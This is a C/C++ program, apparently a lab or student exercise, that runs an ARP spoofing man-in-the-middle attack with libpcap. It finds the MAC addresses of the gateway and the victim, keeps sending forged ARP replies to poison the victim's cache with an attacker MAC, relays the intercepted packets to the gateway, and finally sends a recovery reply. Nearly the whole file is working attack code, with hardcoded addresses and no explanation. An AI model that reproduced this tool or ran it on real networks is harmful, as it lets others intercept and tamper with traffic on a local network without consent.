#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>
#include <pthread.h>
#include <iostream>

int RECOVERY_CHECK = 1;

#pragma pack(push, 1)
struct custom_arp_hdr
{
    uint16_t ar_hrd;
    uint16_t ar_pro;
    uint8_t  ar_hln;
    uint8_t  ar_pln;
    uint16_t ar_op;
    uint8_t ar_sha[6];
    uint32_t ar_sip;
    uint8_t ar_tha[6];
    uint32_t ar_tip;
};
#pragma pack(pop)

typedef struct thread_value
{
    char *sender_value;
    u_int victim_value;
    u_int gateway_value;
}thread_value;

void packet_function(int p_type, u_int gateway_func_ip, pcap_t *handle_func)
{
    u_char function_buf[sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr)] =  {0,};
    libnet_ethernet_hdr* eth_function = (libnet_ethernet_hdr*)function_buf;
    custom_arp_hdr* arp_function = (custom_arp_hdr*)(function_buf + sizeof(libnet_ethernet_hdr));

    eth_function->ether_dhost[0] = 0xff;
    eth_function->ether_dhost[1] = 0xff;
    eth_function->ether_dhost[2] = 0xff;
    eth_function->ether_dhost[3] = 0xff;
    eth_function->ether_dhost[4] = 0xff;
    eth_function->ether_dhost[5] = 0xff;

    eth_function->ether_shost[0] = 0x00;
    eth_function->ether_shost[1] = 0x0c;
    eth_function->ether_shost[2] = 0x29;
    eth_function->ether_shost[3] = 0x97;
    eth_function->ether_shost[4] = 0x9f;
    eth_function->ether_shost[5] = 0xb2;

    eth_function->ether_type = htons(ETHERTYPE_ARP);

    arp_function->ar_hrd = htons(ARPHRD_ETHER);
    arp_function->ar_pro = htons(ETHERTYPE_IP);
    arp_function->ar_hln = 6;
    arp_function->ar_pln = 4;
    arp_function->ar_op = htons(ARPOP_REQUEST);

    arp_function->ar_sha[0] = 0x00;
    arp_function->ar_sha[1] = 0x0c;
    arp_function->ar_sha[2] = 0x29;
    arp_function->ar_sha[3] = 0x97;
    arp_function->ar_sha[4] = 0x9f;
    arp_function->ar_sha[5] = 0xb2;

    arp_function->ar_sip = inet_addr("192.168.162.130");

    arp_function->ar_tha[0] = 0x00;
    arp_function->ar_tha[1] = 0x00;
    arp_function->ar_tha[2] = 0x00;
    arp_function->ar_tha[3] = 0x00;
    arp_function->ar_tha[4] = 0x00;
    arp_function->ar_tha[5] = 0x00;

    arp_function->ar_tip = gateway_func_ip;

    if(pcap_sendpacket(handle_func, (u_char*)function_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr))) != 0){
        if(p_type == 1) std::cout<<"Request gateway packet error\n";
        if(p_type == 2) std::cout<<"Request sender packet error\n";
    }

    else{
        for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr)); i++) printf("%02x ", function_buf[i]);

        if(p_type == 1) std::cout<<"Send request gateway packet\n";
        if(p_type == 2) std::cout<<"Send request sender packet\n";
     }
}

void *packet_handler(void *arg)
{
    thread_value* pi = (thread_value*)arg;
    char *sender_v = pi -> sender_value;
    u_int victim_v = pi -> victim_value;
    u_int gateway_v = pi -> gateway_value;
    char errbuf_th[PCAP_ERRBUF_SIZE];
    pcap_t *handle_th;

    handle_th = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf_th);

    if(handle_th == NULL){
        fprintf(stderr, "%s\n", errbuf_th);

        return (void*)(2);
    }

    u_char send_buf[sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18] =  {0,};
    libnet_ethernet_hdr* eth_header = (libnet_ethernet_hdr*)send_buf;
    custom_arp_hdr* arp_header = (custom_arp_hdr*)(send_buf + sizeof(libnet_ethernet_hdr));

    eth_header->ether_dhost[0] = sender_v[0];
    eth_header->ether_dhost[1] = sender_v[1];
    eth_header->ether_dhost[2] = sender_v[2];
    eth_header->ether_dhost[3] = sender_v[3];
    eth_header->ether_dhost[4] = sender_v[4];
    eth_header->ether_dhost[5] = sender_v[5];

    eth_header->ether_shost[0] = 0x0a;
    eth_header->ether_shost[1] = 0x0b;
    eth_header->ether_shost[2] = 0x0c;
    eth_header->ether_shost[3] = 0x0d;
    eth_header->ether_shost[4] = 0x0e;
    eth_header->ether_shost[5] = 0x0f; // virtual attacker mac

    eth_header->ether_type = htons(ETHERTYPE_ARP);

    arp_header->ar_hrd = htons(ARPHRD_ETHER);
    arp_header->ar_pro = htons(ETHERTYPE_IP);
    arp_header->ar_hln = 6;
    arp_header->ar_pln = 4;
    arp_header->ar_op = htons(ARPOP_REPLY);

    arp_header->ar_sha[0] = 0x0a;
    arp_header->ar_sha[1] = 0x0b;
    arp_header->ar_sha[2] = 0x0c;
    arp_header->ar_sha[3] = 0x0d;
    arp_header->ar_sha[4] = 0x0e;
    arp_header->ar_sha[5] = 0x0f; // virtual attacker mac

    arp_header->ar_sip = gateway_v;

    arp_header->ar_tha[0] = sender_v[0];
    arp_header->ar_tha[1] = sender_v[1];
    arp_header->ar_tha[2] = sender_v[2];
    arp_header->ar_tha[3] = sender_v[3];
    arp_header->ar_tha[4] = sender_v[4];
    arp_header->ar_tha[5] = sender_v[5];

    arp_header->ar_tip = victim_v;

    for(int i = 42; i <= 59; i++) send_buf[i] = 0x00;

    while(1){
        if(pcap_sendpacket(handle_th, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
            std::cout<<"Arp packet error\n";

        else{
            for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18); i++) printf("%02x ", send_buf[i]);

            std::cout<<"Arp packet send\n";
        }

        sleep(1);
    }
}

void *recovery_handler(void *arg)
{
    while(1){
        std::cin>>RECOVERY_CHECK;

        if(RECOVERY_CHECK == 0) break;
    }

    return 0;
}

int main(int argc, char **argv)
{
    if(argc != 3){
        std::cout<<"Usage : "<<argv[0]<<" <Sender IP> <Receiver IP>"<<std::endl;
        exit(1);
    }

    pcap_t *handle;
    char *dev, errbuf[PCAP_ERRBUF_SIZE], receiver_mac[6], sender_mac[6];
    u_int victim_ip, gateway_ip;
    pthread_t packet_threads, recovery_threads;
    thread_value thread_data;

    dev = pcap_lookupdev(errbuf);

    if(dev == NULL){
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);

        return(2);
    }

    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);

    if(handle == NULL){
        fprintf(stderr, "%s\n", errbuf);

        return(2);
    }

    victim_ip = inet_addr(argv[1]);
    gateway_ip = inet_addr(argv[2]);

    while(1){ //get gateway mac address
        const u_char *p_gateway;
        struct pcap_pkthdr *h_gateway;
        int res_gateway = pcap_next_ex(handle, &h_gateway, &p_gateway);
        struct custom_arp_hdr* arp_gwcheck = (struct custom_arp_hdr*)(p_gateway + sizeof(struct libnet_ethernet_hdr));

        packet_function(1, gateway_ip, handle);

        if(res_gateway == 1){
            std::cout<<"successful"<<std::endl;
            if(arp_gwcheck->ar_sip == gateway_ip){
                receiver_mac[0] = arp_gwcheck->ar_sha[0];
                receiver_mac[1] = arp_gwcheck->ar_sha[1];
                receiver_mac[2] = arp_gwcheck->ar_sha[2];
                receiver_mac[3] = arp_gwcheck->ar_sha[3];
                receiver_mac[4] = arp_gwcheck->ar_sha[4];
                receiver_mac[5] = arp_gwcheck->ar_sha[5];

                std::cout<<"Find gateway mac address\n";

                break;
            }
        }

        sleep(1);
    }

    while(1){ //get sender mac address
        const u_char *p_sender;
        struct pcap_pkthdr *h_sender;
        int res_sender = pcap_next_ex(handle, &h_sender, &p_sender);
        struct custom_arp_hdr* arp_sdcheck = (struct custom_arp_hdr*)(p_sender + sizeof(struct libnet_ethernet_hdr));

        packet_function(2, victim_ip, handle);

        if(res_sender == 1){
            if(arp_sdcheck->ar_sip == victim_ip){
                sender_mac[0] = arp_sdcheck->ar_sha[0];
                sender_mac[1] = arp_sdcheck->ar_sha[1];
                sender_mac[2] = arp_sdcheck->ar_sha[2];
                sender_mac[3] = arp_sdcheck->ar_sha[3];
                sender_mac[4] = arp_sdcheck->ar_sha[4];
                sender_mac[5] = arp_sdcheck->ar_sha[5];

                std::cout<<"Find sender mac address\n";

                break;
            }
        }

        sleep(1);
    }

    thread_data.sender_value = sender_mac;
    thread_data.victim_value = victim_ip;
    thread_data.gateway_value = gateway_ip;

    if(pthread_create(&packet_threads, NULL, packet_handler, (void*)&thread_data) < 0)
        std::cout<<"Packet thread error";

    if(pthread_create(&recovery_threads, NULL, recovery_handler, (void*)NULL) < 0)
        std::cout<<"Recovery thread error";

    while(1){
        const u_char *p;
        struct pcap_pkthdr *h;
        int res = pcap_next_ex(handle, &h, &p);
        struct libnet_ethernet_hdr* eth_check = (struct libnet_ethernet_hdr*)p;

        if(res == -1) break;
        if(res == 1){
            if((eth_check->ether_shost[0] == 0x00) &&
                    (eth_check->ether_shost[1] == 0x0c) &&
                    (eth_check->ether_shost[2] == 0x29) &&
                    (eth_check->ether_shost[3] == 0x81) &&
                    (eth_check->ether_shost[4] == 0x57) &&
                    (eth_check->ether_shost[5] == 0x56)){ // victim mac
                eth_check->ether_dhost[0] = receiver_mac[0];
                eth_check->ether_dhost[1] = receiver_mac[1];
                eth_check->ether_dhost[2] = receiver_mac[2];
                eth_check->ether_dhost[3] = receiver_mac[3];
                eth_check->ether_dhost[4] = receiver_mac[4];
                eth_check->ether_dhost[5] = receiver_mac[5]; // gateway mac

                eth_check->ether_shost[0] = 0x0a;
                eth_check->ether_shost[1] = 0x0b;
                eth_check->ether_shost[2] = 0x0c;
                eth_check->ether_shost[3] = 0x0d;
                eth_check->ether_shost[4] = 0x0e;
                eth_check->ether_shost[5] = 0x0f; // victim mac (x) virtual attacker mac (o)

                 //++ shost->attack mac plus

                if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0) std::cout<<"Relay error\n";

                else std::cout<<"Relay packet\n";
            }
        }

        if(RECOVERY_CHECK == 0) break;
    }

    u_char recovery_buf[sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18] =  {0,};
    libnet_ethernet_hdr* eth_header = (libnet_ethernet_hdr*)recovery_buf;
    custom_arp_hdr* arp_header = (custom_arp_hdr*)(recovery_buf + sizeof(libnet_ethernet_hdr));

    eth_header->ether_dhost[0] = sender_mac[0];
    eth_header->ether_dhost[1] = sender_mac[1];
    eth_header->ether_dhost[2] = sender_mac[2];
    eth_header->ether_dhost[3] = sender_mac[3];
    eth_header->ether_dhost[4] = sender_mac[4];
    eth_header->ether_dhost[5] = sender_mac[5]; // victim mac

    eth_header->ether_shost[0] = receiver_mac[0];
    eth_header->ether_shost[1] = receiver_mac[1];
    eth_header->ether_shost[2] = receiver_mac[2];
    eth_header->ether_shost[3] = receiver_mac[3];
    eth_header->ether_shost[4] = receiver_mac[4];
    eth_header->ether_shost[5] = receiver_mac[5]; // gateway mac not change

    eth_header->ether_type = htons(ETHERTYPE_ARP);

    arp_header->ar_hrd = htons(ARPHRD_ETHER);
    arp_header->ar_pro = htons(ETHERTYPE_IP);
    arp_header->ar_hln = 6;
    arp_header->ar_pln = 4;
    arp_header->ar_op = htons(ARPOP_REPLY);

    arp_header->ar_sha[0] = receiver_mac[0];
    arp_header->ar_sha[1] = receiver_mac[1];
    arp_header->ar_sha[2] = receiver_mac[2];
    arp_header->ar_sha[3] = receiver_mac[3];
    arp_header->ar_sha[4] = receiver_mac[4];
    arp_header->ar_sha[5] = receiver_mac[5]; // gateway mac not change

    arp_header->ar_sip = gateway_ip;// gateway ip not change

    arp_header->ar_tha[0] = 0x00;
    arp_header->ar_tha[1] = 0x0c;
    arp_header->ar_tha[2] = 0x29;
    arp_header->ar_tha[3] = 0x81;
    arp_header->ar_tha[4] = 0x57;
    arp_header->ar_tha[5] = 0x56; // victim mac

    arp_header->ar_tip = victim_ip; // victim ip

    for(int i = 42; i <= 59; i++) recovery_buf[i] = 0x00;

    if(pcap_sendpacket(handle, (u_char*)recovery_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
        std::cout<<"Recovery error\n";

    else std::cout<<"Recovery arp cache\n";
}
